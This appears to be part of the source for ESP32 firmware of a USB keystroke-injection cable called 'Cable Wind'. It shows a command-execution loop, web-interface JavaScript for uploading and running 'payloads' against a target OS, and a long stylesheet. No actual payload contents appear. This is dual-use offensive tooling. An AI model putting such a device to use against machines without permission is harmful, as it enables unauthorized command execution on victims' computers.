\"\\r\\n\");\n    while (splitlines != NULL) {\n      cmd = splitlines;\n      payloadExec();\n      splitlines = strtok(NULL, \"\\r\\n\");\n      vTaskDelay(1);\n    }\n    payload_state = 0;\n    cmd = \"\";\n    livepayload = \"\";\n    payloadExecuted = true;\n  }\n\n  // WiFi connection monitoring\n  if (millis() - lastWifiCheckTime >= wifiCheckInterval) {\n    lastWifiCheckTime = millis();\n    \n    // Only attempt reconnection if we're not currently connected\n    if (WiFi.status() != WL_CONNECTED) {\n      connectToWiFi();\n    }\n  }\n  vTaskDelay(1);\n}"
    },
    {
      "name": "javascript.h",
      "content": "const char Redirect[] PROGMEM = R\"=====(\n\n// Track navigation state and abort controller globally\nlet isNavigating = false;\nlet connectionController = null;\nlet navigationTimeout = null;\n\nfunction checkConnection() {\n    if (isNavigating) {\n        if (connectionController) {\n            connectionController.abort();\n        }\n        return;\n    }\n\n    // Abort any existing connection check\n    if (connectionController) {\n        connectionController.abort();\n    }\n\n    connectionController = new AbortController();\n    const timeoutId = setTimeout(() => connectionController.abort(), 1000);\n\n    // Check if we're on the homepage\n    const isHomePage = window.location.pathname === '/' || window.location.pathname === '/index.html';\n\n    fetch(isHomePage ? '/stats' : '/connectioncheck', { \n        signal: connectionController.signal \n    })\n    .then(response => {\n        clearTimeout(timeoutId);\n        if (isNavigating) return;\n\n        if (isHomePage) {\n            return response.json().then(data => {\n                updateStats(data);\n            });\n        } else {\n            updateConnectionStatus(response.ok);\n            return response.json();\n        }\n    })\n    .catch(error => {\n        clearTimeout(timeoutId);\n        if (error.name !== 'AbortError' && !isNavigating) {\n            updateConnectionStatus(false);\n            if (isHomePage) {\n                // Set default values when offline\n                document.getElementById('uptime').innerText = 'N/A';\n                document.getElementById('cpu0').innerText = 'N/A';\n                document.getElementById('cpu1').innerText = 'N/A';\n                document.getElementById('temperature').innerText = 'N/A';\n                document.getElementById('freespiffs').innerText = 'N/A';\n                document.getElementById('totalram').innerText = 'N/A';\n                document.getElementById('freeram').innerText = 'N/A';\n                document.getElementById('targetos').innerText = 'N/A';\n                document.getElementById('ssid').innerText = 'N/A';\n                document.getElementById('ipaddress').innerText = 'N/A';\n            }\n        }\n    });\n}\n\nfunction updateConnectionStatus(isOnline) {\n    document.querySelectorAll('.status-indicator').forEach(indicator => {\n        indicator.classList.toggle('status-online', isOnline);\n        indicator.classList.toggle('status-offline', !isOnline);\n    });\n\n    if (window.location.pathname !== '/') {\n        document.querySelectorAll('.cable-wind-logo').forEach(title => {\n            title.classList.toggle('online', isOnline);\n            title.classList.toggle('offline', !isOnline);\n        });\n    }\n}\n\nfunction updateStats(data) {\n    // Update all stats that exist in index.h\n    if (data.uptime) document.getElementById('uptime').innerText = data.uptime + ' seconds';\n    if (data.cpu0) document.getElementById('cpu0').innerText = data.cpu0 + ' MHz';\n    if (data.cpu1) document.getElementById('cpu1').innerText = data.cpu1 + ' MHz';\n    if (data.temperature) document.getElementById('temperature').innerText = data.temperature.toFixed(1) + ' \ufffd\ufffdC';\n    if (data.freespiffs) document.getElementById('freespiffs').innerText = formatBytes(data.freespiffs);\n    if (data.totalram) document.getElementById('totalram').innerText = formatBytes(data.totalram);\n    if (data.freeram) document.getElementById('freeram').innerText = formatBytes(data.freeram);\n    if (data.os) document.getElementById('targetos').innerText = data.os;\n    if (data.ssid) document.getElementById('ssid').innerText = data.ssid;\n    if (data.ipaddress) document.getElementById('ipaddress').innerText = data.ipaddress;\n\n    // Update connection status indicator\n    updateConnectionStatus(true);\n}\n\n// Format bytes helper function\nfunction formatBytes(bytes) {\n    if (bytes === 0) return '0 Bytes';\n    const k = 1024;\n    const sizes = ['Bytes', 'KB', 'MB', 'GB'];\n    const i = Math.floor(Math.log(bytes) / Math.log(k));\n    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];\n}\n\nsetInterval(checkConnection, 5000);\ncheckConnection();\n\nfunction togglePayload(action) {\n    var checkbox = document.getElementById('toggle' + action);\n    var message = document.getElementById('message' + action);\n\n    if (checkbox.checked) {\n        var form = document.getElementById('config');\n        var formData = new FormData(form);\n\n        fetch('/runlive' + action.toLowerCase(), {\n            method: 'POST',\n            body: formData,\n            mode: 'cors'\n        })\n        .then(response => response.text())\n        .then(data => {\n            pollPayloadStatus(action);\n        })\n        .catch(error => {\n            console.error('Error:', error);\n        });\n    } else {\n        message.innerText = '';\n    }\n}\n\nfunction pollPayloadStatus(action) {\n    var checkbox = document.getElementById('toggle' + action);\n    var message = document.getElementById('message' + action);\n\n    fetch('/payloadstatus' + action.toLowerCase())\n    .then(response => response.json())\n    .then(data => {\n        console.log('Polling result:', data);\n\n        if (data.status === 'executed') {\n            checkbox.checked = false;\n            message.innerText = 'The action has been executed successfully';\n        } else {\n            setTimeout(function() { pollPayloadStatus(action); }, 1000);\n        }\n    })\n    .catch(error => {\n        console.error('Error:', error);\n    });\n}\n\nfunction handleSubmit(event) {\n    event.preventDefault();\n\n    const formData = new FormData(document.getElementById('uploadForm'));\n    const uploadMessage = document.getElementById('uploadMessageContainer');\n\n    fetch('/upload', {\n        method: 'POST',\n        body: formData\n    })\n    .then(response => response.json())\n    .then(data => {\n        if (data.status === 'success') {\n            showMessage('success', data.message);\n            document.getElementById('uploadForm').reset();\n        } else {\n            showMessage('error', data.message);\n        }\n    })\n    .catch(error => {\n        showMessage('error', 'Error uploading file');\n        console.error('Error:', error);\n    });\n}\n\nfunction showMessage(type, text) {\n    const container = document.getElementById('global-toast') || document.createElement('div');\n    if (!container.id) {\n        container.id = 'global-toast';\n        container.className = 'toast-container';\n        document.body.appendChild(container);\n    }\n    \n    const toast = document.createElement('div');\n    toast.className = `toast-message ${type}`;\n    \n    const messageSpan = document.createElement('span');\n    messageSpan.textContent = text;\n    \n    const closeButton = document.createElement('span');\n    closeButton.className = 'toast-close';\n    closeButton.innerHTML = '&times;';\n    closeButton.onclick = () => {\n        toast.style.animation = 'toastFadeOut 0.3s ease-out';\n        setTimeout(() => toast.remove(), 300);\n    };\n    \n    toast.appendChild(messageSpan);\n    toast.appendChild(closeButton);\n    container.appendChild(toast);\n    \n    const timer = setTimeout(() => {\n        toast.style.animation = 'toastFadeOut 0.3s ease-out';\n        setTimeout(() => toast.remove(), 300);\n    }, 5000);\n    \n    closeButton.onclick = () => {\n        clearTimeout(timer);\n        toast.style.animation = 'toastFadeOut 0.3s ease-out';payload\n        \n        setTimeout(() => toast.remove(), 300);\n    };\n}\n\n// Prevent double-tap zoom on iOS\ndocument.addEventListener('touchstart', function(event) {\n    if (event.touches.length > 1) {\n        event.preventDefault();\n    }\n}, { passive: false });\n\ndocument.addEventListener('gesturestart', function(e) {\n    e.preventDefault();\n});\n\ndocument.addEventListener(\"DOMContentLoaded\", function () {\n    const links = document.querySelectorAll(\"#menu a\");\n\n    links.forEach(link => {\n        link.addEventListener('click', function(e) {\n            if (this.classList.contains('active')) {\n                e.preventDefault();\n                return;\n            }\n\n            // Clear any pending navigation timeout\n            if (navigationTimeout) {\n                clearTimeout(navigationTimeout);\n            }\n\n            // Set navigation flag and abort any ongoing connection check\n            isNavigating = true;\n            if (connectionController) {\n                connectionController.abort();\n            }\n\n            // Add loading class to body\n            document.body.classList.add('page-loading');\n\n            // Set a timeout to ensure navigation happens even if something hangs\n            navigationTimeout = setTimeout(() => {\n                window.location.href = this.href;\n            }, 100); // Reduced from 300ms to 100ms\n\n            // For iOS, prevent default and use location.href after a small delay\n            if (/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream) {\n                e.preventDefault();\n                setTimeout(() => {\n                    window.location.href = this.href;\n                }, 50);\n            }\n        });\n    });\n    // Reset navigation flag when page loads\n    isNavigating = false;\n    document.body.classList.remove('page-loading');\n\n    // --- OS-based payload filter ---\n    const select = document.getElementById(\"os-filter\");\n    if (select) {\n        function filterPayloads(os) {\n            const payloads = document.querySelectorAll(\".payload-item\");\n            payloads.forEach(el => {\n                const itemOS = el.getAttribute(\"data-os\") || \"all\";\n                el.style.display = (os === \"all\" || itemOS === os) ? \"\" : \"none\";\n            });\n        }\n    \n        // Defer localStorage access to prevent blocking\n        setTimeout(() => {\n            // Load saved filter option from localStorage\n            const savedOS = localStorage.getItem(\"selectedOS\") || \"all\";\n            select.value = savedOS;\n            filterPayloads(savedOS);\n        }, 0);\n    \n        // Save new selection and re-filter\n        select.addEventListener(\"change\", function() {\n            // Use requestIdleCallback for non-urgent updates\n            requestIdleCallback(() => {\n                const selected = this.value.toLowerCase();\n                localStorage.setItem(\"selectedOS\", selected);\n                filterPayloads(selected);\n            }, { timeout: 200 }); // Fallback if idle takes too long\n        });\n    }\n});\n)=====\";"
    },
    {
      "name": "style.h",
      "content": "const char Style[] PROGMEM = R\"=====(\n:root {\n  --primary: #00f2ff;\n  --secondary: #00ff88;\n  --accent: #ff00aa;\n  --dark: #0a0a12;\n  --darker: #050508;\n  --light: #f0f0ff; /* Changed from #e0e0ff */\n  --success: #00ff88;\n  --error: #ff0033;\n  --warning: #ffaa00;\n}\n\nbody {\n  background-color: #000000; /* Pure black */\n  color: var(--light);\n  font-family: 'Courier New', monospace;\n  margin: 0;\n  padding: 0;\n  overflow-x: hidden;\n  line-height: 1.6;\n}\n\n/* Header/Navigation - Mobile First */\n#menu {\n  background: var(--darker);\n  border-bottom: 1px solid var(--primary);\n  box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);\n  padding: 10px 0;\n  position: relative; /* Changed from sticky to relative */\n  top: auto; /* Remove sticky positioning */\n  z-index: 100;\n}\n\n#menu ul {\n  display: none;\n  flex-direction: column;\n  padding: 0;\n  margin: 0;\n  list-style: none;\n  width: 100%;\n}\n\n#menu li {\n  margin: 5px 0;\n  position: relative;\n}\n\n#menu a {\n  color: var(--light);\n  text-decoration: none;\n  padding: 10px 15px;\n  display: block;\n  transition: all 0.3s;\n  position: relative;\n  touch-action: manipulation; /* Disable double-tap zoom */\n}\n\n#menu a:hover {\n  color: var(--primary);\n  background: rgba(0, 242, 255, 0.1);\n  will-change: width; \n}\n\n#menu a::after {\n  content: '';\n  position: absolute;\n  bottom: 0;\n  left: 50%;\n  transform: translateX(-50%);\n  width: 0;\n  height: 2px;\n  background: var(--primary);\n  transition: width 0.3s;\n}\n\n#menu a:hover::after {\n  width: 70%;\n}\n\n#menu .usb-icon {\n  vertical-align: middle;\n  margin-right: 5px;\n}\n\n/* Active menu item */\n#menu a.active {\n  color: var(--primary);\n  font-weight: bold;\n}\n\n#menu a.active::after {\n  width: 70%;\n}\n\n/* Hamburger menu - Mobile - Left side */\n#responsive-menu + label {\n  display: block;\n  cursor: pointer;\n  padding: 5px 15px;\n  position: absolute;\n  top: 0;\n  left: 0;\n  z-index: 101;\n  background: var(--darker); /* Add background to match menu */\n}\n\n#responsive-menu + label::before {\n  content: \"\ufffd\ufffd\ufffd\";\n  font-size: 1.5em;\n  color: var(--primary);\n}\n\n#responsive-menu:checked + label::before {\n  content: \"\ufffd\ufffd\ufffd\";\n}\n\n#responsive-menu:checked ~ ul {\n  display: flex;\n  flex-direction: column;\n  align-items: center; /* Center menu items */\n  text-align: center; /* Center text */\n  padding-top: 60px; /* Make space for hamburger */\n}\n\n/* Adjust menu items for centered layout */\n#responsive-menu:checked ~ ul li {\n  width: 100%;\n  text-align: center;\n}\n\n#responsive-menu:checked ~ ul a {\n  justify-content: center;\n}\n\n/* Main content */\n.view-container {\n  background: rgba(10, 10, 18, 0.8);\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 15px;\n  margin-top: 20px;\n  margin: 15px auto;\n  max-width: 900px;\n  box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);\n  position: relative;\n  overflow: hidden;\n}\n\n.view-container::before {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: 0;\n  width: 100%;\n  height: 3px;\n  background: linear-gradient(90deg, var(--primary), var(--secondary));\n}\n\n/* Buttons */\nbutton, input[type=\"submit\"], input[type=\"button\"] {\n  background: linear-gradient(135deg, var(--primary), var(--secondary));\n  color: var(--darker);\n  border: none;\n  padding: 5px 5px;\n  font-weight: bold;\n  border-radius: 3px;\n  cursor: pointer;\n  transition: all 0.3s;\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  position: relative;\n  overflow: hidden;\n  font-family: 'Courier New', monospace;\n  font-size: 12px;\n  margin: 5px;\n  min-height: 44px;\n}\n\nbutton:hover, input[type=\"submit\"]:hover, input[type=\"button\"]:hover {\n  transform: translateY(-2px);\n  box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\nbutton::after {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: -100%;\n  width: 100%;\n  height: 100%;\n  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);\n  transition: 0.5s;\n}\n\nbutton:hover::after {\n  left: 100%;\n}\n\nbutton[name=\"deleteWifiButton\"], \nbutton[name=\"deleteUSBButton\"],\nbutton[name=\"deleteBackupWifiButton\"],\nbutton[name=\"clearCacheButton\"] {\n  background: linear-gradient(135deg, var(--error), #cc0022);\n}\n\n/* Input fields - Improved for mobile */\n/* Form inputs - one line height */\ninput:not([type=\"checkbox\"]):not([type=\"file\"]),\nselect {\n  height: 36px; /* Fixed height for single-line inputs */\n  padding: 8px 12px;\n  line-height: 1.2;\n}\n\ntextarea {\n  min-height: 100px; /* Keep textareas taller */\n  resize: none;\n}\n\n* {\n  -webkit-tap-highlight-color: transparent;\n}\n\n.single-line-input {\n  height: 36px !important;\n  line-height: 36px !important;\n  padding: 0 12px !important;\n}\n\ninput, textarea, select {\n  background: rgba(0, 0, 0, 0.3);\n  border: 1px solid var(--primary);\n  color: var(--light);\n  padding: 8px 12px;\n  border-radius: 3px;\n  width: 100%;\n  margin-bottom: 12px;\n  font-family: 'Courier New', monospace;\n  transition: all 0.3s;\n  box-sizing: border-box;\n  font-size: 16px !important;\n}\n\ninput:focus, textarea:focus, select:focus {\n  outline: none;\n  border-color: var(--secondary);\n  box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);\n}*/\n\ninput[type=\"checkbox\"] {\n  width: auto;\n  margin-right: 10px;\n}\n\n/* Form groups - Improved spacing */\n.form-group {\n  margin-bottom: 15px;\n}\n\n.form-group label {\n  display: block;\n  margin-top: 10px;\n  margin-bottom: 6px;\n  color: var(--primary);\n  font-weight: bold;\n  font-size: 1em;\n}\n\n/* Validation styles */\n#validationStatus {\n  display: block;\n  font-size: 0.85em;\n  white-space: pre-wrap;\n  font-family: 'Courier New', monospace;\n  background-color: rgba(10, 10, 10, 0.9);\n  padding: 8px;\n  border-radius: 3px;\n  border-left: 3px solid var(--error);\n  margin-top: 5px;\n}\n\n.validation-ok {\n  color: var(--success);\n  border-left-color: var(--success) !important;\n}\n\n.validation-error {\n  color: var(--error);\n}\n\n.validation-empty {\n    color: #666; /* Gray color for empty state */\n    font-style: italic;\n    display: block; /* Ensure it's visible */\n}\n\n/* Desktop specific styles */\n@media (min-width: 768px) {\n  #validationStatus {\n    padding-left: 30px;\n    text-indent: -20px;\n    line-height: 1.4;\n  }\n  \n  #validationStatus::before {\n    content: \"\ufffd\ufffd\ufffd \";\n    color: var(--primary);\n    margin-right: 5px;\n  }\n}\n\n/* Mobile specific styles */\n@media (max-width: 767px) {\n  #validationStatus {\n    padding-left: 15px;\n  }\n}\n\n/* Payload list */\n.payload-list-container {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));\n  gap: 12px;\n  margin: 15px 0;\n}\n\n.payload-item {\n    border: 1px solid var(--primary);\n    border-radius: 3px;\n    padding: 12px;\n    margin-bottom: 12px;\n    background-color: rgba(10, 10, 10, 0.9);\n}\n\n.payload-desc {\n    color: #aaa;\n    font-size: 0.85em;\n    margin: 8px 0;\n    line-height: 1.4;\n    max-height: 2.8em; /* 2 lines */\n    overflow: hidden;\n    text-overflow: ellipsis;\n    display: -webkit-box;\n    -webkit-line-clamp: 2;\n    -webkit-box-orient: vertical;\n    white-space: pre-line;\n}\n\n.payload-filename {\n    color: #666;\n    font-size: 0.75em;\n    font-family: monospace;\n}\n\n.payload-item, .payload-item-os {\n  border: 1px solid var(--primary);\n  border-radius: 3px;\n  padding: 12px;\n  transition: all 0.3s;\n  position: relative;\n  background-color: rgba(10, 10, 10, 0.9); /* Darker than before */\n}\n\n.payload-item:hover, .payload-item-os:hover {\n  transform: translateY(-5px);\n  box-shadow: 0 10px 20px rgba(0, 242, 255, 0.2);\n  border-color: var(--secondary);\n}\n\n.payload-item::before, .payload-item-os::before {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: 0;\n  width: 3px;\n  height: 100%;\n  background: linear-gradient(to bottom, var(--primary), var(--secondary));\n}\n\n.payload-description-content {\n    padding: 0 15px;\n    text-align: left;\n    font-size: 0.9em;\n    line-height: 1.5;\n    margin: 0;\n    text-indent: 0;\n    white-space: pre-line;\n}\n\n.payload-description-content p:first-child,\n.payload-description-content div:first-child {\n    margin-top: 0;\n    text-indent: 0;\n}\n\n.payload-description-header {\n    text-align: center;\n    padding: 12px;\n    cursor: pointer;\n    background: rgba(5, 5, 8, 0.7);\n    border-bottom: 1px solid var(--primary);\n}\n\n/* Payload Description Styles */\n.payload-description-container {\n    border: 1px solid var(--primary);\n    border-radius: 5px;\n    margin: 15px 0;\n    overflow: hidden;\n    background: rgba(10, 10, 18, 0.8);\n}\n\n.payload-description-header {\n    padding: 12px 15px;\n    cursor: pointer;\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    color: var(--primary);\n    font-weight: bold;\n    transition: all 0.3s;\n    background: rgba(5, 5, 8, 0.7);\n}\n\n.payload-description-header:hover {\n    background: rgba(0, 242, 255, 0.1);\n}\n\n.payload-description-content.expanded {\n    max-height: 500px;\n    overflow-y: auto;\n    white-space: pre-line;\n}\n\n.toggle-icon {\n    font-size: 0.8em;\n    transition: transform 0.3s;\n    margin-left: 10px;\n}\n\n.payload-filename {\n  color: #666;\n  font-size: 11px;\n  font-family: monospace;\n}\n\n/* Terminal style elements */\n.terminal-style, .payload-container pre, textarea.payload-input {\n  border: 1px solid var(--primary);\n  color: var(--secondary);\n  padding: 12px;\n  border-radius: 3px;\n  font-family: 'Courier New', monospace;\n  position: relative;\n  width: 100%;\n  overflow: auto;\n  max-height: 80vh;\n  height: 20em;\n  resize: vertical;\n  white-space: pre-wrap;\n  word-wrap: break-word;\n  box-sizing: border-box;\n  background-color: rgba(10, 10, 10, 0.9); /* Darker than before */\n}\n\n/* Toast notifications - Centered below menu */\n.toast-container {\n  position: fixed;\n  top: 80px; /* Below the menu */\n  left: 0;\n  right: 0;\n  z-index: 1000;\n  width: 90%;\n  max-width: 400px;\n  margin: 0 auto;\n  text-align: center;\n}\n\n.toast-message {\n  position: relative;\n  padding: 15px 20px;\n  margin-bottom: 10px;\n  border-radius: 4px;\n  color: white;\n  box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);\n  animation: toastSlideDown 0.3s ease-out;\n  pointer-events: auto;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  background-color: var(--darker);\n  border-top: 3px solid; /* Changed from border-left to border-top */\n}\n\n@keyframes toastSlideDown {\n  from { \n    opacity: 0;\n    transform: translateY(-30px);\n  }\n  to { \n    opacity: 1;\n    transform: translateY(0);\n  }\n}\n\n@keyframes toastFadeOut {\n  from { \n    opacity: 1;\n    transform: translateY(0);\n  }\n  to { \n    opacity: 0;\n    transform: translateY(-30px);\n  }\n}\n\n.toast-message.success {\n  border-top-color: var(--success); /* Changed from border-left */\n  color: var(--success);\n}\n\n.toast-message.error {\n  border-top-color: var(--error); /* Changed from border-left */\n  color: var(--error);\n}\n\n.toast-message.warning {\n  border-top-color: var(--warning); /* Changed from border-left */\n  color: var(--warning);\n}\n\n.toast-close {\n  cursor: pointer;\n  margin-left: 12px;\n  font-size: 1.1em;\n  color: inherit;\n}\n\n/* OS boxes for autoexec - Mobile optimized */\n.os-container {\n  display: flex;\n  flex-wrap: wrap;\n  justify-content: space-between;\n  margin: 15px 0;\n  gap: 12px;\n}\n\n.os-box {\n  flex: 1 1 150px;\n  min-height: 120px;\n  border: 2px dashed var(--primary);\n  border-radius: 5px;\n  padding: 12px;\n  background-color: rgba(51, 51, 51, 0.3);\n  text-align: center;\n  position: relative;\n  transition: all 0.3s;\n}\n\n.os-box.highlight {\n  border-color: var(--secondary);\n  background-color: rgba(0, 122, 255, 0.1);\n}\n\n.os-box h3 {\n  margin-top: 0;\n  color: var(--primary);\n  border-bottom: 1px solid var(--primary);\n  padding-bottom: 5px;\n  font-size: 16px;\n}\n\n.payload-preview {\n  background-color: rgba(0, 0, 0, 0.5);\n  border-radius: 5px;\n  padding: 8px;\n  margin: 8px 0;\n  word-break: break-word;\n  font-size: 13px;\n}\n\n.payload-item-os {\n  position: relative;\n  z-index: 1;\n  margin-bottom: 5px; /* Ensure spacing between items */\n}\n\n/* Command tables */\n.command-table {\n  width: 100%;\n  border-collapse: collapse;\n  margin: 15px 0;\n  font-size: 0.85em;\n  color: var(--light);\n}\n\n.command-table th, .command-table td {\n  padding: 6px 10px;\n  border: 1px solid var(--primary);\n  text-align: left;\n}\n\n.command-table th {\n  background-color: rgba(68, 68, 68, 0.5);\n  font-weight: bold;\n  color: var(--primary);\n}\n\n.command-table tr:nth-child(even) {\n  background-color: rgba(51, 51, 51, 0.3);\n}\n\n.command-table tr:hover {\n  background-color: rgba(85, 85, 85, 0.3);\n}\n\n.command-cell {\n  cursor: pointer;\n  transition: background-color 0.2s;\n}\n\n.command-cell:hover {\n  background-color: rgba(0, 122, 255, 0.2) !important;\n}\n\n/* Special cable wind elements */\n.cable-wind-logo {\n  text-align: center;\n  margin: 25px 0 15px 0; /* Increased top margin */\n  font-size: 2em;\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  color: var(--primary);\n  text-shadow: 0 0 8px var(--primary);\n  position: relative;\n  z-index: 1;\n}\n\n.clickable-os {\n  cursor: pointer;\n  color: var(--primary);\n  text-decoration: underline;\n  transition: color 0.3s;\n}\n\n.clickable-os:hover {\n  color: var(--secondary);\n}\n\n/* Button containers */\n.button-container, .button-container-os {\n  display: flex;\n  flex-wrap: wrap;\n  justify-content: center;\n  gap: 8px;\n  margin: 15px 0;\n}\n\n.button-container button, \n.button-container-os button {\n  flex: auto;\n  min-width: 100px;\n  background: linear-gradient(135deg, var(--primary), var(--secondary));\n  color: var(--darker);\n  border: none;\n  padding: 10px 20px;\n  font-weight: bold;\n  border-radius: 3px;\n  cursor: pointer;\n  transition: all 0.3s;\n  min-width: 100px; /* Fixed minimum width */\n  width: 100px; /* Fixed width */\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  position: relative;\n  overflow: hidden;\n  font-family: 'Courier New', monospace;\n  font-size: 14px;\n  margin: 5px;\n  min-height: 44px;\n  white-space: nowrap; /* Prevent text wrapping */\n  margin-left: auto; /* Push to the right */\n  flex-shrink: 0; /* Prevent shrinking */\n}\n\n.select-os-btn {\n    /* Make button wider to accommodate longer text */\n    width: 140px;\n    min-width: 140px;\n    max-width: 140px;\n    /* Visual styling */\n    background: linear-gradient(135deg, var(--primary), var(--secondary));\n    color: var(--darker);\n    border: none;\n    padding: 10px 8px;\n    font-weight: bold;\n    border-radius: 3px;\n    cursor: pointer;\n    transition: all 0.3s;\n    /* Text styling */\n    text-transform: uppercase;\n    letter-spacing: 1px;\n    font-family: 'Courier New', monospace;\n    font-size: 12px;\n    white-space: nowrap;\n    overflow: hidden;\n    text-overflow: ellipsis;\n    /* Positioning */\n    position: relative;\n    margin: 5px;\n    flex-shrink: 0;\n    display: inline-flex;\n    align-items: center;\n    justify-content: center;\n    margin-left: auto;\n}\n\n.button-container button:hover, \n.button-container-os button:hover,\n.select-os-btn:hover {\n  transform: translateY(-2px);\n  box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\n\n.button-container button::after, \n.button-container-os button::after,\n.select-os-btn::after {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: -100%;\n  width: 100%;\n  height: 100%;\n  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);\n  transition: 0.5s;\n}\n\n.button-container button:hover::after, \n.button-container-os button:hover::after,\n.select-os-btn:hover::after {\n  left: 100%;\n}\n\n/* HR styling */\nhr {\n  border: none;\n  height: 1px;\n  background-color: var(--primary);\n  margin: 15px 0;\n}\n\n/* Stat containers */\n.stat-container {\n  display: flex;\n  flex-wrap: wrap;\n  justify-content: center;\n  gap: 12px;\n  margin: 15px 0;\n}\n\n.stat-group {\n  flex: 1 1 180px;\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 12px;\n  min-width: 0;\n  background-color: rgba(10, 10, 10, 0.9); /* Darker than before */\n}\n\n/* Form containers */\n.config-container {\n  background: rgba(51, 51, 51, 0.3);\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 15px;\n  margin: 15px auto;\n  max-width: 600px;\n}\n\n/* Config page specific buttons */\n.config-buttons-container {\n    display: flex;\n    justify-content: space-between;\n    margin: 15px 0;\n    width: 100%;\n}\n\n.config-buttons-container button {\n    width: 48%;\n    min-width: auto;\n    margin: 0;\n}\n\nbutton[name=\"clearCacheButton\"] {\n    background: linear-gradient(135deg, var(--error), #cc0022);\n}\n\nbutton[name=\"rebootDeviceButton\"] {\n    background: linear-gradient(135deg, var(--warning), #ff6600);\n}\n\n/* Metadata form */\n#metadataForm {\n  background: rgba(51, 51, 51, 0.5);\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 15px;\n  margin: 15px 0;\n  display: none;\n}\n\n/* Payload buttons */\na.pyaloadButton {\n  background: linear-gradient(135deg, var(--primary), var(--secondary));\n  color: var(--darker);\n  border: none;\n  padding: 10px 12px;\n  font-weight: bold;\n  border-radius: 3px;\n  display: block;\n  text-align: center;\n  text-decoration: none;\n  margin: 8px 0;\n  transition: all 0.3s;\n}\n\na.pyaloadButton:hover {\n  transform: translateY(-2px);\n  box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\n/* Responsive design */\n/* Hide only the hamburger menu checkbox (not other inputs) */\n#responsive-menu {\n  position: absolute;\n  width: 1px;\n  height: 1px;\n  padding: 0;\n  margin: -1px;\n  overflow: hidden;\n  clip: rect(0, 0, 0, 0);\n  white-space: nowrap;\n  border: 0;\n}\n\n@media (min-width: 768px) {\n  /* Show regular menu on desktop */\n  #menu ul {\n    display: flex !important; /* Important to override the checked state */\n    flex-direction: row;\n    justify-content: center;\n    flex-wrap: wrap;\n  }\n\n  #menu li {\n    margin: 0 15px;\n  }\n  \n  /* Hide hamburger menu on desktop */\n  #responsive-menu,\n  #responsive-menu + label {\n    display: none !important;\n  }\n\n  /* Force menu to always be visible on desktop */\n  #menu ul {\n    display: flex !important;\n    flex-direction: row;\n  }\n\n  /* Hide hamburger menu on desktop */\n  #responsive-menu {\n    display: none !important;\n  }\n  \n  /* Adjust container sizes for desktop */\n  .view-container {\n    padding: 20px;\n    margin: 20px auto;\n  }\n  \n  .os-box {\n    flex: 1 1 200px;\n    min-height: 150px;\n  }\n  \n  .terminal-style, textarea.payload-input {\n    height: 23em;\n  }\n  \n  .cable-wind-logo {\n    font-size: 2.5em;\n  }\n}\n\n/* OS Selection Modal */\n.os-modal {\n    position: fixed;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n    background-color: rgba(0, 0, 0, 0.8);\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    z-index: 10000;\n}\n\n.os-modal-content {\n    background: var(--darker);\n    border: 2px solid var(--primary);\n    border-radius: 8px;\n    padding: 20px;\n    max-width: 90%;\n    width: 400px;\n    box-shadow: 0 0 20px rgba(0, 242, 255, 0.5);\n}\n\n.os-modal h3 {\n    color: var(--primary);\n    margin-top: 0;\n    text-align: center;\n}\n\n.os-options {\n    display: grid;\n    grid-template-columns: 1fr 1fr;\n    gap: 10px;\n    margin: 20px 0;\n}\n\n.os-options button {\n    background: linear-gradient(135deg, var(--primary), var(--secondary));\n    color: var(--darker);\n    border: none;\n    padding: 12px;\n    border-radius: 4px;\n    font-weight: bold;\n    cursor: pointer;\n    transition: all 0.3s;\n}\n\n.os-options button:hover {\n    transform: translateY(-2px);\n    box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\n.close-modal {\n    background: var(--error) !important;\n    width: 100%;\n    margin-top: 10px;\n}\n\n.payload-header {\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    margin-bottom: 8px;\n    gap: 10px;\n}\n\n.payload-header strong {\n    flex-grow: 1; /* Allow the text to take remaining space */\n    overflow: hidden;\n    text-overflow: ellipsis;\n    white-space: nowrap;\n}\n\n.select-os-btn:hover {\n    background: linear-gradient(135deg, #55616F, #73879F);\n}\n\n/* Add this to your style.css */\n.status-indicator {\n    display: inline-block;\n    width: 12px;\n    height: 12px;\n    border-radius: 50%;\n    margin-left: 8px;\n    vertical-align: middle;\n}\n\n.status-online {\n    background-color: var(--success);\n    box-shadow: 0 0 8px var(--success);\n}\n\n.status-offline {\n    background-color: var(--error);\n    box-shadow: 0 0 8px var(--error);\n}\n\n/* Page title indicators */\n.cable-wind-logo::after {\n    content: '';\n    display: inline-block;\n    width: 10px;\n    height: 10px;\n    border-radius: 50%;\n    margin-left: 12px;\n    vertical-align: middle;\n}\n\n.cable-wind-logo.online::after {\n    background-color: var(--success);\n    box-shadow: 0 0 6px var(--success);\n}\n\n.cable-wind-logo.offline::after {\n    background-color: var(--error);\n    box-shadow: 0 0 6px var(--error);\n}\n\n@media (max-width: 480px) {\n    .select-os-btn {\n      width: 100px;\n      min-width: 100px;\n      max-width: 100px;\n      padding: 6px 4px;\n      font-size: 11px;\n    